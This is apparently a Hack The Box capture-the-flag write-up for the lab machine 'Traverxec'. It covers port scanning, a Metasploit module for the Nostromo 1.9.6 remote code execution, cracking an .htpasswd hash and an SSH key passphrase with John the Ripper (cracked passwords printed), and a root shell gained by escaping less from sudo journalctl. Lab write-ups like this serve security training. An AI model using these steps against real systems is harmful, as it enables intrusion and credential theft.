# NMAP
## nmap -A -p- -T5 -o traverxec.nmap 10.10.10.165
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 12:16 CET
Nmap scan report for 10.10.10.165
Host is up (0.053s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   53.88 ms 10.10.14.1
2   53.85 ms 10.10.10.165

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.32 seconds
```
# Nostromo 1.9.6
[Exploit CVE 47563][1] Directory Traversal Remote Code Excecution

exploit/multi/http/nostromo_code_exec msfconsole

# Enumerating files
```
ls -la /etc
total 656
drwxr-xr-x 73 root root    4096 Nov 12 04:56 .
drwxr-xr-x 18 root root    4096 Oct 25 14:17 ..
-rw-------  1 root root       0 Oct 25 14:15 .pwd.lock
drwxr-xr-x  3 root root    4096 Oct 25 14:16 X11
-rw-r--r--  1 root root    2981 Oct 25 14:15 adduser.conf
-rw-r--r--  1 root root      44 Oct 25 14:32 adjtime
drwxr-xr-x  2 root root    4096 Oct 25 14:20 alternatives
drwxr-xr-x  3 root root    4096 Oct 25 14:20 apm
drwxr-xr-x  2 root root    4096 Oct 25 14:16 apparmor
drwxr-xr-x  7 root root    4096 Oct 25 14:20 apparmor.d
drwxr-xr-x  7 root root    4096 Oct 25 14:32 apt
-rw-r--r--  1 root root    1994 Apr 18  2019 bash.bashrc
-rw-r--r--  1 root root      45 Feb 11  2019 bash_completion
-rw-r--r--  1 root root     367 Mar  2  2018 bindresvport.blacklist
drwxr-xr-x  2 root root    4096 May 24  2019 binfmt.d
drwxr-xr-x  3 root root    4096 Oct 25 14:20 ca-certificates
-rw-r--r--  1 root root    5713 Oct 25 14:20 ca-certificates.conf
drwxr-xr-x  2 root root    4096 Oct 25 14:16 calendar
drwxr-xr-x  2 root root    4096 Nov 12 03:58 console-setup
drwxr-xr-x  2 root root    4096 Oct 25 14:19 cron.d
drwxr-xr-x  2 root root    4096 Oct 25 14:20 cron.daily
drwxr-xr-x  2 root root    4096 Oct 25 14:16 cron.hourly
drwxr-xr-x  2 root root    4096 Oct 25 14:16 cron.monthly
drwxr-xr-x  2 root root    4096 Oct 25 14:20 cron.weekly
-rw-r--r--  1 root root    1042 Jun 23  2019 crontab
drwxr-xr-x  4 root root    4096 Oct 25 14:20 dbus-1
-rw-r--r--  1 root root    2969 Feb 26  2019 debconf.conf
-rw-r--r--  1 root root       5 Aug 30  2019 debian_version
drwxr-xr-x  3 root root    4096 Nov 12 04:04 default
-rw-r--r--  1 root root     604 Jun 26  2016 deluser.conf
drwxr-xr-x  4 root root    4096 Oct 25 14:16 dhcp
drwxr-xr-x  2 root root    4096 Oct 25 14:21 dictionaries-common
-rw-r--r--  1 root root     346 Jan 14  2018 discover-modprobe.conf
drwxr-xr-x  2 root root    4096 Oct 25 14:18 discover.conf.d
drwxr-xr-x  4 root root    4096 Oct 25 14:15 dpkg
drwxr-xr-x  3 root root    4096 Oct 25 14:20 emacs
-rw-r--r--  1 root root       0 Oct 25 14:15 environment
-rw-r--r--  1 root root     664 Nov 12 04:56 fstab
-rw-r--r--  1 root root    2584 Aug  1  2018 gai.conf
drwxr-xr-x  2 root root    4096 Oct 25 14:20 groff
-rw-r--r--  1 root root     708 Oct 25 14:34 group
-rw-r--r--  1 root root     684 Oct 25 14:32 group-
drwxr-xr-x  2 root root    4096 Oct 25 14:21 grub.d
-rw-r-----  1 root shadow   597 Oct 25 14:34 gshadow
-rw-r-----  1 root shadow   575 Oct 25 14:32 gshadow-
drwxr-xr-x  3 root root    4096 Oct 25 14:20 gss
-rw-r--r--  1 root root    5060 Oct 26  2018 hdparm.conf
-rw-r--r--  1 root root       9 Aug  7  2006 host.conf
-rw-r--r--  1 root root      10 Oct 25 14:16 hostname
-rw-r--r--  1 root root     203 Oct 25 14:16 hosts
-rw-r--r--  1 root root     411 Oct 25 14:20 hosts.allow
-rw-r--r--  1 root root     711 Oct 25 14:20 hosts.deny
drwxr-xr-x  2 root root    4096 Nov 12 04:56 init.d
drwxr-xr-x  5 root root    4096 Oct 25 14:17 initramfs-tools
-rw-r--r--  1 root root    1748 May  5  2018 inputrc
drwxr-xr-x  4 root root    4096 Oct 25 14:16 iproute2
drwxr-xr-x  2 root root    4096 Nov 12 06:30 iptables
-rw-r--r--  1 root root      27 May 13  2019 issue
-rw-r--r--  1 root root      20 May 13  2019 issue.net
drwxr-xr-x  5 root root    4096 Oct 25 14:16 kernel
-rw-r--r--  1 root root     144 Oct 25 14:32 kernel-img.conf
-rw-r--r--  1 root root   16107 Nov 12 04:56 ld.so.cache
-rw-r--r--  1 root root      34 Mar  2  2018 ld.so.conf
drwxr-xr-x  2 root root    4096 Nov 12 04:56 ld.so.conf.d
drwxr-xr-x  2 root root    4096 Oct 25 14:20 ldap
-rw-r--r--  1 root root     191 Apr 25  2019 libaudit.conf
-rw-r--r--  1 root root    2995 May  1  2019 locale.alias
-rw-r--r--  1 root root    9376 Oct 25 14:16 locale.gen
lrwxrwxrwx  1 root root      36 Oct 25 14:17 localtime -> /usr/share/zoneinfo/America/New_York
drwxr-xr-x  3 root root    4096 Oct 25 14:16 logcheck
-rw-r--r--  1 root root   10477 Jul 27  2018 login.defs
-rw-r--r--  1 root root     435 Aug 22  2018 logrotate.conf
drwxr-xr-x  2 root root    4096 Oct 25 14:16 logrotate.d
-r--r--r--  1 root root      33 Oct 25 14:16 machine-id
-rw-r--r--  1 root root     111 Mar  2  2019 magic
-rw-r--r--  1 root root     111 Mar  2  2019 magic.mime
-rw-r--r--  1 root root    3397 Oct 25 15:29 mailcap
-rw-r--r--  1 root root     449 Feb  9  2019 mailcap.order
-rw-r--r--  1 root root    5174 Feb 10  2019 manpath.config
-rw-r--r--  1 root root   24512 Feb  9  2019 mime.types
-rw-r--r--  1 root root     812 Dec 15  2018 mke2fs.conf
drwxr-xr-x  2 root root    4096 Feb  9  2019 modprobe.d
-rw-r--r--  1 root root     195 Oct 25 14:16 modules
drwxr-xr-x  2 root root    4096 Oct 25 14:17 modules-load.d
-rw-r--r--  1 root root       0 Oct 25 15:47 motd
lrwxrwxrwx  1 root root      19 Oct 25 14:34 mtab -> ../proc/self/mounts
-rw-r--r--  1 root root    9278 Jun 11  2019 nanorc
drwxr-xr-x  7 root root    4096 Nov 12 04:06 network
-rw-r--r--  1 root root      60 Oct 25 14:16 networks
-rw-r--r--  1 root root     510 Oct 25 14:20 nsswitch.conf
drwxr-xr-x  2 root root    4096 Oct 25 14:15 opt
lrwxrwxrwx  1 root root      21 Aug 30  2019 os-release -> ../usr/lib/os-release
-rw-r--r--  1 root root     552 Feb 14  2019 pam.conf
drwxr-xr-x  2 root root    4096 Nov 12 04:56 pam.d
-rw-r--r--  1 root root    1395 Oct 25 14:34 passwd
-rw-r--r--  1 root root    1328 Oct 25 14:32 passwd-
drwxr-xr-x  4 root root    4096 Oct 25 14:20 perl
-rw-r--r--  1 root root     767 Mar  4  2016 profile
drwxr-xr-x  2 root root    4096 Oct 25 14:20 profile.d
-rw-r--r--  1 root root    2932 Feb  9  2019 protocols
drwxr-xr-x  2 root root    4096 Oct 25 14:20 python
drwxr-xr-x  2 root root    4096 Oct 25 14:20 python2.7
drwxr-xr-x  2 root root    4096 Oct 25 14:16 python3
drwxr-xr-x  2 root root    4096 Oct 25 14:16 python3.7
drwxr-xr-x  2 root root    4096 Nov 12 04:56 rc0.d
drwxr-xr-x  2 root root    4096 Nov 12 04:56 rc1.d
drwxr-xr-x  2 root root    4096 Nov 12 04:56 rc2.d
drwxr-xr-x  2 root root    4096 Nov 12 04:56 rc3.d
drwxr-xr-x  2 root root    4096 Nov 12 04:56 rc4.d
drwxr-xr-x  2 root root    4096 Nov 12 04:56 rc5.d
drwxr-xr-x  2 root root    4096 Nov 12 04:56 rc6.d
drwxr-xr-x  2 root root    4096 Oct 25 14:38 rcS.d
-rw-r--r--  1 root root    3267 Aug 28  2019 reportbug.conf
-rw-r--r--  1 root root      61 Oct 25 14:34 resolv.conf
lrwxrwxrwx  1 root root      13 Apr 23  2019 rmt -> /usr/sbin/rmt
-rw-r--r--  1 root root     887 Feb  9  2019 rpc
-rw-r--r--  1 root root    2007 Oct 25 16:23 rsyslog.conf
drwxr-xr-x  2 root root    4096 Feb 26  2019 rsyslog.d
-rw-r--r--  1 root root    4141 Jul 27  2018 securetty
drwxr-xr-x  4 root root    4096 Oct 25 14:15 security
drwxr-xr-x  2 root root    4096 Oct 25 14:15 selinux
-rw-r--r--  1 root root   18774 Feb  9  2019 services
-rw-r-----  1 root shadow   940 Oct 27 04:56 shadow
-rw-r-----  1 root shadow   908 Oct 25 14:32 shadow-
-rw-r--r--  1 root root     116 Oct 25 14:15 shells
drwxr-xr-x  2 root root    4096 Oct 25 14:15 skel
drwxr-xr-x  2 root root    4096 Oct 25 14:21 ssh
drwxr-xr-x  4 root root    4096 Oct 25 14:20 ssl
-rw-r--r--  1 root root      19 Oct 25 14:32 subgid
-rw-r--r--  1 root root       0 Oct 25 14:15 subgid-
-rw-r--r--  1 root root      19 Oct 25 14:32 subuid
-rw-r--r--  1 root root       0 Oct 25 14:15 subuid-
-r--r-----  1 root root     862 Oct 27 16:23 sudoers
drwxr-xr-x  2 root root    4096 Oct 25 14:38 sudoers.d
-rw-r--r--  1 root root    2384 Oct 25 14:37 sysctl.conf
drwxr-xr-x  2 root root    4096 Oct 25 14:17 sysctl.d
drwxr-xr-x  5 root root    4096 Oct 25 14:17 systemd
drwxr-xr-x  2 root root    4096 Oct 25 14:17 terminfo
-rw-r--r--  1 root root      17 Oct 25 14:17 timezone
drwxr-xr-x  2 root root    4096 May 24  2019 tmpfiles.d
-rw-r--r--  1 root root    1260 Dec 14  2018 ucf.conf
drwxr-xr-x  4 root root    4096 Oct 25 14:17 udev
drwxr-xr-x  3 root root    4096 Oct 25 14:20 ufw
drwxr-xr-x  2 root root    4096 Oct 25 14:17 update-motd.d
drwxr-xr-x  2 root root    4096 Oct 25 14:16 vim
drwxr-xr-x  3 root root    4096 Nov 12 04:56 vmware-caf
drwxr-xr-x  6 root root    4096 Nov 12 04:56 vmware-tools
-rw-r--r--  1 root root    4942 Apr  5  2019 wgetrc
-rw-r--r--  1 root root     642 Mar  1  2019 xattr.conf
drwxr-xr-x  3 root root    4096 Oct 25 14:15 xdg
```

```
cat sshd_config
#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
#AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server
```

```
cd /var/nostromo/conf
$ ls -la
ls -la
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27 16:12 .
drwxr-xr-x 6 root root   4096 Oct 25 14:43 ..
-rw-r--r-- 1 root bin      41 Oct 25 15:20 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25 14:26 mimes
-rw-r--r-- 1 root bin     498 Oct 25 15:20 nhttpd.conf
$ cat .htpasswd 
cat .htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```
# John the ripper time
`zcat /usr/share/wordlists/rockyou.txt.gz  | john -stdin david.txt`
david:Nowonly4me (not for ssh)

# Continuing enumerating

```
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

`cd /home/david/public_www`
```
$ ls
ls
index.html  protected-file-area
$ cd protected-file-area
cd protected-file-area
$ ls
ls
backup-ssh-identity-files.tgz
```
Let's download ***backup-ssh-identity-files.tgz*** °L°

`base64 backup-ssh-identity-files.tgz`
`base64 -d ssh.tgz.b64 > ssh.tgz`
`tar xvfz ssh.tgz`

# John the Ripper time pt.2 °L°

`/usr/share/john/ssh2john.py id_rsa > id_rsa.john`
`zcat /usr/share/wordlists/rockyou.txt.gz  | john -stdin id_rsa.john`
password sshkey ***hunter***

# SSH to david

` ssh -i home/david/.ssh/id_rsa david@10.10.10.165` 
# Find something interesting

there's a bin dir inside of it there are 2 files:

***server_stats.sh***
```bash
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```
Launching this command we can get a less with sudo 
`/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`
running `!/bin/bash` we drop into a root shell 

[//]: #Links
[1]: https://www.exploit-db.com/exploits/47573

![htbbadge](https://www.hackthebox.eu/badge/image/272787)
